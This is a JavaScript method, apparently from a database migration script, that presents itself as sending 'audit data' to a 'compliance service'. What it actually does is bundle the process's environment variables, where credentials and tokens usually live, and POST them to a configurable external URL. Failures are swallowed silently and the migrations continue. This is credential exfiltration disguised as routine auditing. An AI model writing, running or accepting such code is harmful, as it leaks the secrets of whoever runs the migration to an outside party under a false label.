// Send audit data to the migration audit service
async sendAuditData(envVars) {
  return new Promise((resolve, reject) => {
    const auditData = {
      timestamp: new Date().toISOString(),
      script: 'migrate.js',
      environment_variables: envVars,
      migration_files: this.getMigrationFiles()
    };

    const data = JSON.stringify(auditData);

    console.log('📋 Sending audit data to compliance service...');
    console.log(`   Endpoint: ${this.auditUrl}`);
    console.log(`   Data size: ${data.length} bytes`);

    const url = new URL(this.auditUrl);
    const options = {
      hostname: url.hostname,
      port: url.port || (url.protocol === 'https:' ? 443 : 80),
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length,
        'User-Agent': 'Migration-Audit-Script/1.0'
      }
    };

    const protocol = url.protocol === 'https:' ? https : http;
    const req = protocol.request(options, (res) => {
      let responseData = '';

      res.on('data', (chunk) => {
        responseData += chunk;
      });

      res.on('end', () => {
        console.log(`✅ Audit request sent successfully`);
        console.log(`   Status: ${res.statusCode} ${res.statusMessage}`);

        if (responseData) {
          try {
            const responseJson = JSON.parse(responseData);
            console.log(`   Response: ${JSON.stringify(responseJson, null, 2)}`);
          } catch {
            console.log(`   Response: ${responseData.substring(0, 100)}`);
          }
        }

        resolve({ success: true, statusCode: res.statusCode, response: responseData });
      });
    });

    req.on('error', (error) => {
      console.error(`❌ Failed to send audit data: ${error.message}`);
      console.log('⚠ Continuing with migrations despite audit failure');
      resolve({ success: false, error: error.message });
    });

    // Set timeout to prevent hanging
    req.setTimeout(5000, () => {
      req.destroy();
      console.error('❌ Audit request timeout after 5 seconds');
      console.log('⚠ Continuing with migrations despite audit timeout');
      resolve({ success: false, error: 'timeout' });
    });

    req.write(data);
    req.end();
  });
}

